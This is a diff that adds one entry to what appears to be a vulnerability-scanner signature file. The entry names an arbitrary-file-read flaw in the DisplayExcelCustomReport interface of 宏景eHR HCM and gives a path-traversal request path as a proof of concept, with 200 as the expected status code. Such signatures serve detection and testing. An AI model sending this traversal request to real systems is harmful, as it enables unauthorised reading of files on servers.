@@ -1,0 +1,3 @@
+name: "宏景eHR-HCM-DisplayExcelCustomReport接口存在任意文件读取漏洞"
+poc: "/templates/attestation/../../servlet/DisplayExcelCustomReport"
+status_code: 200
